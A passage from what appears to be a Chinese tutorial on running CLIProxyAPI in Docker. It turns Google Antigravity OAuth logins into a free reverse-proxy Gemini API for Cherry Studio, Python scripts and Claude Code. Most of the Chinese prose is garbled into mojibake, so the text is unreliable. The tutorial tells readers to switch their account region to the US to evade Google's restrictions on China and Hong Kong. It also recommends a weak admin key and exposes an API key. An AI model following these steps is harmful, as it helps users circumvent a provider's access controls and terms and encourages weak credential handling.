<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f1780dcc909d49ff85b20c057e176907~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=sHBgb4tD0ttGnc5KOcBWjZsS%2Ff0%3D" alt="image-20260102161456379" loading="lazy"/></p>
<p>è®°ä¸‹æ¥æˆ‘ä»¬ç¼–è¾‘ä¸€ä¸‹config.yamlï¼Œä¸»è¦æ˜¯ä¿®æ”¹api-keysã€remote-management.allow-remoteã€secret-key</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/85033de3d58a49a09ec0d1a869029583~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=NoGf7eW5HCdPLljNcWEoD4MVp70%3D" alt="image-20260102161732676" loading="lazy"/></p>
<p>å‚è€ƒä¸Šé¢çš„è®¾ç½®å³å¯ã€‚å…¶ä¸­secret-key ä¸»è¦æ˜¯åé¢å¯åŠ¨ç™»å½•çš„è´¦å·ï¼Œå¯ä»¥è®¾ç½®æ¯”è¾ƒç®€å•çš„123456ç­‰ç­‰ã€‚ç³»ç»Ÿä¼šåŠ å¯†ï¼Œä¸ç”¨ç®¡ä¸Šé¢æˆªå›¾ä¿¡æ¯ã€‚</p>
<h3 data-id="heading-4">ä¸‹è½½å®¹å™¨é•œåƒ</h3>
<p>è¿™é‡Œè€ƒè™‘åˆ°éƒ¨ç½²æ–¹ä¾¿ï¼Œæˆ‘ä»¬ä½¿ç”¨docker å®¹å™¨éƒ¨ç½²ã€‚è¾“å…¥ä¸‹é¢çš„å‘½ä»¤ä¸‹è½½æœ€æ–°çš„é•œåƒï¼Œæˆ‘ç”µè„‘å®‰è£…äº†wslï¼Œæ‰€ä»¥æˆ‘ä½¿ç”¨linuxè¿è¡Œç¯å¢ƒæ¥éƒ¨ç½²è¿™ä¸ªç¨‹åº</p>
<pre><code class="hljs language-bash" lang="bash">docker pull eceasy/cli-proxy-api:v6.6.77
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b0cd2f12219941d89eb178775f22aec4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=xpJeQHocwZQcXueqq63eRfW14tQ%3D" alt="image-20260102162021582" loading="lazy"/></p>
<h3 data-id="heading-5">å¯åŠ¨æœåŠ¡</h3>
<p>é•œåƒä¸‹è½½å®Œæˆåï¼Œæˆ‘ä»¬è¾“å…¥ä¸‹é¢å‘½ä»¤å¯åŠ¨å®¹å™¨</p>
<pre><code class="hljs language-bash" lang="bash">docker run -d \
  -p 8317:8317 \
  -v ./config.yaml:/CLIProxyAPI/config.yaml \
  -v ./auths:/root/.cli-proxy-api \
  eceasy/cli-proxy-api:latest
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/08c3499c20634d12bbf0c36e681e2eef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=UEpwwJEGTOw1i96cOsm2qs4NQmY%3D" alt="image-20260102162322713" loading="lazy"/></p>
<p>å¯åŠ¨å®Œæˆåæˆ‘ä»¬å¯ä»¥åœ¨å®¹å™¨ç¯å¢ƒæŸ¥çœ‹åˆ°8317æœåŠ¡ç«¯å£å¯åŠ¨</p>
<h3 data-id="heading-6">éªŒè¯</h3>
<p>ç¨‹åºå¯åŠ¨å®Œæˆåï¼Œæˆ‘ä»¬å¯ä»¥è¾“å…¥ä¸‹é¢åœ°å€éªŒè¯ä¸€ä¸‹æœåŠ¡æ˜¯å¦å¯ä»¥è®¿é—®</p>
<p><a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A8317%2Fmanagement.html" target="_blank" title="http://localhost:8317/management.html" ref="nofollow noopener noreferrer">http://localhost:8317/management.html</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eb591be3d1534794be1305110ac8f90b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=trpvGIffOkoTMJ693YWT3JvDBQs%3D" alt="image-20260102162600200" loading="lazy"/></p>
<p>çœ‹åˆ°ä¸Šé¢çš„é¡µé¢ è¯´æ˜æœåŠ¡ç«¯æ˜¯å¯ä»¥ä½¿ç”¨çš„ã€‚æˆ‘ä»¬è¾“å…¥ç®¡ç†å‘˜ç§˜é’¥ï¼Œè¿™ç®¡ç†å‘˜ç§˜é’¥å°±æ˜¯æˆ‘ä»¬ä¸Šé¢æˆªå›¾è®¾ç½®çš„</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c409b43ffc4a439b8ea199a92a430bd8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=0KJvQ5BLaHvgCNTgmZBIe6vQF3w%3D" alt="image-20260102162633417" loading="lazy"/></p>
<p>è´¦å·ç§˜é’¥ã€‚è¾“å…¥å¯†ç åç‚¹å‡»ç™»å½•æŒ‰é’®å®Œæˆç™»å½•</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1f65ecda7d044349860660b207dc21b1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=zi5wAqcnXS8sJk26s2vKqUPkqzI%3D" alt="image-20260102162733906" loading="lazy"/></p>
<p>é€šè¿‡ä»¥ä¸Šæ–¹å¼æˆ‘ä»¬å°±å®Œæˆäº†CLIProxyAPIç¨‹åºçš„éƒ¨ç½²ã€‚è§£ææˆ‘ä»¬éœ€è¦åœ¨å®‰è£…<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Frouter-for-me%2FEasyCLI" target="_blank" title="https://github.com/router-for-me/EasyCLI" ref="nofollow noopener noreferrer">EasyCLI</a> è¿™ä¸ªå­é¡¹ç›®</p>
<h3 data-id="heading-7">EasyCLIå®‰è£…</h3>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬åœ¨githubä¸Šæ‰¾åˆ°è¿™ä¸ªEasyCLIé¡¹ç›®ï¼Œå¹¶ä¸‹è½½å®ƒçš„å®‰è£…åŒ…ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7fe0dcbe104f4688a7e5c285fecc84d2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=LZ2KeGAW8hJ5DujAMwnhyh75ZZo%3D" alt="image-20260102163212399" loading="lazy"/></p>
<p>æˆ‘è¿™é‡Œå°±é‚£windowsä¸ºæ¡ˆä¾‹ï¼Œä¸‹è½½åç›´æ¥è§£å‹æ‰“å¼€å³å¯ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3f5d3ad835454a4d8ac939999701a50e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=knBz0LdzlGEKLaYC7IWDPH7j2OM%3D" alt="image-20260102163324353" loading="lazy"/></p>
<p>åŒå‡»æ‰“å¼€åæˆ‘ä»¬é€‰æ‹©è¿œç¨‹ã€‚è¾“å…¥è¯·æ±‚åœ°å€å’Œå¯†ç </p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8197b7d53ebb4eef8c8b38227c8381bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=732yVIoFacbi5snNoj1cSTpPrzY%3D" alt="image-20260102163500250" loading="lazy"/></p>
<p>â€‹     è¿™ä¸ªåœ°å€å’Œè´¦å·å¯†ç å…¶å®å°±æ˜¯ä¸Šé¢çš„CLIProxyAPI åç«¯ç®¡ç†è´¦å·å’Œå¯†ç ã€‚ç™»å½•æˆåŠŸåè¿›å…¥EasyCLIåå°ç®¡ç†</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c31bd5999604df28399b4743e95d23e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=X%2FDqHK2rIilxaz01xOgdcKVb3Mg%3D" alt="image-20260102163549385" loading="lazy"/></p>
<p>ç­‰åæˆ‘ä»¬é€‰æ‹©authentication files ï¼Œç„¶ååœ¨å³ä¸‹è§’new æŒ‰é’®ç‚¹å‡»Antigravity</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9daa1ae012a640398c4d6972597bfa81~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=2HF%2FQCi6w5qzTdkYD3UbAJpomtE%3D" alt="image-20260102163717376" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ffe01365b49a49bf91490a303d72f769~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=X7J%2B7dhCFRdEo9t4ABMpassAOY8%3D" alt="image-20260102163900386" loading="lazy"/></p>
<h3 data-id="heading-8">Google Antigravityâ€ æˆæƒ</h3>
<p>ç‚¹å‡»open linkæ‰“å¼€google æˆæƒ</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6688842daeda43848fcbf4e571a7f2a5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=kSK79j0q2fE3Ai1qjK1HoXtfUPY%3D" alt="image-20260102164001648" loading="lazy"/></p>
<p>å› ä¸ºæˆ‘æµè§ˆå™¨ä¹‹å‰è®°å½•2ä¸ªgoogle çš„è´¦å·ï¼Œæ‰€ä»¥æˆ‘è¿™è¾¹ç‚¹å‡»æˆæƒã€‚å¼¹å‡ºâ€œGoogle Antigravityâ€ æˆæƒé¡µé¢ï¼Œç‚¹å‡»ç™»å½•æŒ‰é’®</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6fee4bc9dad64f30b40e7a59c220e052~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=BXwpuf%2Fpx7Gzr6GP84dT5Bq2PgM%3D" alt="image-20260102164054542" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d04b8c5eadc8432181a6137363fd75d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=bZl%2B01Frec5v0yElJV%2FD5mJS5LQ%3D" alt="image-20260102164140365" loading="lazy"/></p>
<p>å®Œæˆæˆæƒã€‚</p>
<p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ç”±äºGoogle çš„é™åˆ¶ï¼Œæˆ‘ä»¬éœ€è¦æŠŠè‡ªå·±çš„å›½å®¶å’Œåœ°åŒºæ”¹æˆéä¸­å›½åœ°åŒºï¼ˆåŒ…æ‹¬é¦™æ¸¯ï¼‰ï¼Œå»ºè®®ç›´æ¥æ”¹ç¾å›½ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fpolicies.google.com%2Fterms%3Fhl%3Dzh_CN" target="_blank" title="https://policies.google.com/terms?hl=zh_CN" ref="nofollow noopener noreferrer">policies.google.com/terms?hl=zhâ€¦</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ef13aac01e0e4ff48ccfc00502c47849~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=InbdTc%2F59vbaGVyuf4uR7l5%2BfcA%3D" alt="image-20260102164542133" loading="lazy"/></p>
<h3 data-id="heading-9">ä¸‹è½½æˆæƒæ–‡ä»¶å¹¶å¯¼å…¥</h3>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬æŠŠåˆšæ‰æˆæƒåº—2ä¸ªjsonæ–‡æ¡£ä¸‹è½½å¹¶å¯¼å‡ºã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/62bea2d961394b17a34e28a035f05c24~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=ewmz82zbqswQRpsZ7%2B0FCyo6BHo%3D" alt="image-20260102164805971" loading="lazy"/></p>
<p>å›åˆ°CLIProxyAPI åå°ç®¡ç†ç•Œé¢ï¼Œæˆ‘ä»¬åœ¨è®¤è¯æ–‡ä»¶å¯¼å…¥2ä¸ªæ–‡ä»¶</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6e609d686a554942aff2d3ad30138dba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=KdBZqCFWYqWvB5PXaxqdF%2FCaQJk%3D" alt="image-20260102164919438" loading="lazy"/></p>
<p>é€šè¿‡ä¸Šé¢çš„æ–¹å¼æˆ‘ä»¬çš„CLIProxyAPI åå¸¦å°±é…ç½®å®Œæˆäº†ã€‚æˆ‘ç‚¹å‡»å…¶ä¸­ä¸€ä¸ªè´¦å·æ¨¡å‹è¯¦ç»†ä¿¡æ¯å¯ä»¥çœ‹åˆ°å¯ä»¥ä½¿ç”¨çš„æ¨¡å‹</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/753c95da154c440c9688bbc735eb87c6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=%2F3wMK9G0Ab7gvd7oUnFSPEYOYWA%3D" alt="image-20260102165028401" loading="lazy"/></p>
<h2 data-id="heading-10">3.ç¬¬ä¸‰æ–¹å¹³å°ä½¿ç”¨</h2>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±å¯ä»¥åœ¨ç¬¬ä¸‰æ–¹å¹³å°ä¸Šä½¿ç”¨è€…è¿™ä¸ªå…è´¹çš„åå¸¦API äº†</p>
<h3 data-id="heading-11">cherry stuido</h3>
<p>æˆ‘ä»¬ä½¿ç”¨cherry stuido è¿™ä¸ªç¬¬ä¸‰æ–¹å·¥å…·æ¥æµ‹è¯•éªŒè¯ä¸€ä¸‹åå¸¦çš„æ•ˆæœã€‚</p>
<p>æˆ‘ä»¬å…ˆåœ¨cherry stuidoé…ç½®ä¸€ä¸‹</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ee5dcd04f1184531bb74b8dc1dbdff6d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=CtYd3EsLE9BiAElskLS88Pr3rfQ%3D" alt="image-20260102165427041" loading="lazy"/></p>
<p>å¡«å†™apiç§˜é’¥ï¼Œè¿™ç§˜é’¥å°±æ˜¯ä¸Šé¢æˆ‘ä»¬åœ¨conf.yamlé…ç½®çš„api-keysçš„ç§˜é’¥</p>
<p>apiåœ°å€ æˆ‘ä»¬å¡«å†™æœ¬åœ°åœ°å€<a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A8317" target="_blank" title="http://localhost:8317" ref="nofollow noopener noreferrer">http://localhost:8317</a>  ï¼ˆå¦‚æœè¿œç¨‹éƒ¨ç½²å¯ä»¥å¡«å†™è¿œç¨‹æœåŠ¡å™¨åœ°å€ï¼‰</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/caddfce0a20b4a64aa7502cf90293092~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=GVtIYfuGFDae2as7n7PNbZpzyxo%3D" alt="image-20260102165609680" loading="lazy"/></p>
<p>â€‹      ä»¥ä¸Šæˆ‘ä»¬å°±å®Œæˆäº†æ¨¡å‹åŸºæœ¬è®¾ç½®ã€‚</p>
<p>â€‹      æ¥ä¸‹æ¥æˆ‘ä»¬åœ¨èŠå¤©å¯¹è¯ä¸­éªŒè¯æµ‹è¯•</p>
<p>â€‹      é€‰æ‹©gemini-3-flash-preview</p>
<p>â€‹      <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/77a6a1bbd78e4acdb5062b6e582b8adc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=lBLG4UsObMK8ORqK1t%2FeAFQLBCM%3D" alt="image-20260102165821634" loading="lazy"/></p>
<p>â€‹       é€‰æ‹©gemini-3-pro-image-previewæ¨¡å‹ å¯ä»¥ç”Ÿå›¾ï¼ˆè¿™ä¸ªå°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„nano banana proï¼‰</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5918466d8a274357aeaf77a92cd48830~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=wMMVf%2Fw3KVbC9BtrYXwrzTVhFTA%3D" alt="image-20260102165745631" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a84ceeeb91b407f88a76ca737e7a79a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=6xnq9pYjXd04msidqeiiwriTwhM%3D" alt="image-20260102170351317" loading="lazy"/></p>
<h3 data-id="heading-12">ä½¿ç”¨ä»£ç å®ç°</h3>
<p>â€‹    è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨pythonæ¥å®ç°è¿™ä¸ªæ¥å£è°ƒç”¨ï¼Œæˆ‘ä»¬è¿™é‡Œå°±æ–‡ç”Ÿå›¾æ¥å£æµ‹è¯•</p>
<p>testgemini-3-pro-image-preview.py</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> json
<span class="hljs-keyword">import</span> base64
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> re

url = <span class="hljs-string">"http://localhost:8317/v1/chat/completions"</span>

payload = json.dumps({
   <span class="hljs-string">"model"</span>: <span class="hljs-string">"gemini-3-pro-image-preview"</span>,
   <span class="hljs-string">"messages"</span>: [
      {
         <span class="hljs-string">"role"</span>: <span class="hljs-string">"user"</span>,
         <span class="hljs-string">"content"</span>: [
            {
               <span class="hljs-string">"type"</span>: <span class="hljs-string">"text"</span>,
               <span class="hljs-string">"text"</span>: <span class="hljs-string">"2ä¸ªèƒèŸ¹åœ¨æ‰“æ¶"</span>
            }
         ]
      }
   ]
})
headers = {
   <span class="hljs-string">'Authorization'</span>: <span class="hljs-string">'Bearer sk_zhouhuizhou'</span>,
   <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>
}

<span class="hljs-built_in">print</span>(<span class="hljs-string">"æ­£åœ¨å‘é€è¯·æ±‚..."</span>)
response = requests.request(<span class="hljs-string">"POST"</span>, url, headers=headers, data=payload)

<span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:
    res_text = response.text
    <span class="hljs-comment"># å°è¯•åŒ¹é… base64 æ¨¡å¼</span>
    <span class="hljs-comment"># æ¨¡å¼ 1: data:image/xxx;base64,xxxx</span>
    pattern1 = <span class="hljs-string">r'base64,([A-Za-z0-9+/=]{50,})'</span>
    match1 = re.search(pattern1, res_text)
    
    base64_str = <span class="hljs-literal">None</span>
    <span class="hljs-keyword">if</span> match1:
        base64_str = match1.group(<span class="hljs-number">1</span>)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-comment"># æ¨¡å¼ 2: JSON å­—æ®µä¸­çš„é•¿å­—ç¬¦ä¸² (å‡è®¾æ˜¯ base64)</span>
        <span class="hljs-keyword">try</span>:
            res_data = response.json()
            content = res_data.get(<span class="hljs-string">'choices'</span>, [{}])[<span class="hljs-number">0</span>].get(<span class="hljs-string">'message'</span>, {}).get(<span class="hljs-string">'content'</span>, <span class="hljs-string">''</span>)
            <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(content, <span class="hljs-built_in">list</span>):
                <span class="hljs-comment"># å¤„ç†åˆ—è¡¨å½¢å¼çš„ content</span>
                <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> content:
                    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(item, <span class="hljs-built_in">dict</span>):
                        text = item.get(<span class="hljs-string">'text'</span>, <span class="hljs-string">''</span>)
                        <span class="hljs-keyword">if</span> <span class="hljs-string">'base64,'</span> <span class="hljs-keyword">in</span> text:
                            base64_str = text.split(<span class="hljs-string">'base64,'</span>)[<span class="hljs-number">1</span>].strip()
                            <span class="hljs-keyword">break</span>
                        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(text) &gt; <span class="hljs-number">100</span>: <span class="hljs-comment"># å¯èƒ½æ˜¯çº¯ base64</span>
                            base64_str = text.strip()
                            <span class="hljs-keyword">break</span>
            <span class="hljs-keyword">elif</span> <span class="hljs-built_in">isinstance</span>(content, <span class="hljs-built_in">str</span>):
                <span class="hljs-keyword">if</span> <span class="hljs-string">'base64,'</span> <span class="hljs-keyword">in</span> content:
                    base64_str = content.split(<span class="hljs-string">'base64,'</span>)[<span class="hljs-number">1</span>].strip()
                <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(content) &gt; <span class="hljs-number">100</span>:
                    base64_str = content.strip()
        <span class="hljs-keyword">except</span>:
            <span class="hljs-keyword">pass</span>

    <span class="hljs-keyword">if</span> base64_str:
        <span class="hljs-comment"># æ¸…ç†å¯èƒ½å­˜åœ¨çš„å¼•å·æˆ–è½¬ä¹‰å­—ç¬¦</span>
        base64_str = base64_str.split(<span class="hljs-string">'"'</span>)[<span class="hljs-number">0</span>].split(<span class="hljs-string">'\\'</span>)[<span class="hljs-number">0</span>].strip()
        
        <span class="hljs-keyword">try</span>:
            image_data = base64.b64decode(base64_str)
            output_filename = <span class="hljs-string">"output_crab_fight.png"</span>
            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_filename, <span class="hljs-string">"wb"</span>) <span class="hljs-keyword">as</span> f:
                f.write(image_data)
            
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å›¾ç‰‡å·²æˆåŠŸä¿å­˜ï¼"</span>)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ–‡ä»¶è·¯å¾„: <span class="hljs-subst">{os.path.abspath(output_filename)}</span>"</span>)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ‰€åœ¨ç›®å½•: <span class="hljs-subst">{os.path.dirname(os.path.abspath(output_filename))}</span>"</span>)
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"è§£ç å›¾ç‰‡å¤±è´¥: <span class="hljs-subst">{e}</span>"</span>)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"æœªåœ¨å“åº”ä¸­è¯†åˆ«åˆ° base64 æ•°æ®ã€‚"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"å“åº”å‰ 500 å­—ç¬¦:"</span>, res_text[:<span class="hljs-number">500</span>])
<span class="hljs-keyword">else</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"è¯·æ±‚å¤±è´¥ï¼ŒçŠ¶æ€ç : <span class="hljs-subst">{response.status_code}</span>"</span>)
    <span class="hljs-built_in">print</span>(response.text)

</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/94dcd36a33e24416ab0588839a2d2400~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=MRT32orqZdpwjPnFLA9dUOEK5YU%3D" alt="image-20260102172730956" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f29a252948034653abe7839d8f7a0e91~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=sbHxPWqyIreKkq5LcxaMFp4t3DI%3D" alt="image-20260102172756805" loading="lazy"/></p>
<p>æˆ‘ä»¬é€šè¿‡ä»£ç ä¹Ÿå®ç°äº†æ–‡ç”Ÿå›¾è°ƒç”¨Antigravityå®ç°ç”Ÿå›¾åŠŸèƒ½äº†</p>
<h3 data-id="heading-13">claude code</h3>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬ä½¿ç”¨æœ¬åœ°claude code æ¥å®ç°ã€‚è¿™é‡Œé…ç½®æˆ‘ä»¬ä½¿ç”¨cc-switché…ç½®ã€‚å…³äºcc-switché…ç½® é…ç½®ä¸ç†Ÿæ‚‰çš„å¯ä»¥çœ‹æˆ‘ä¹‹å‰çš„æ–‡ç« </p>
<p>ã€Š<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FxuwAwfZZiYzKhnPVrvitug" target="_blank" title="https://mp.weixin.qq.com/s/xuwAwfZZiYzKhnPVrvitug" ref="nofollow noopener noreferrer">CC-Switché…ç½®åˆ‡æ¢ç¥å™¨ï¼š5ç§’æå®šå¤šè®¾å¤‡åŒæ­¥ï¼Œåšæœäº‘è®©é…ç½®æ°¸ä¸ä¸¢å¤±</a>ã€‹</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8216234b5635452b807749877aacf40d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767954119&amp;x-signature=lOOzk8AWRjaG2KrjOkdK9MRgSBA%3D" alt="image-20260102173424243" loading="lazy"/></p>
<p>cc-switchå®Œæˆåï¼Œæˆ‘ä»¬å¯åŠ¨æœ¬åœ°claud code</p>
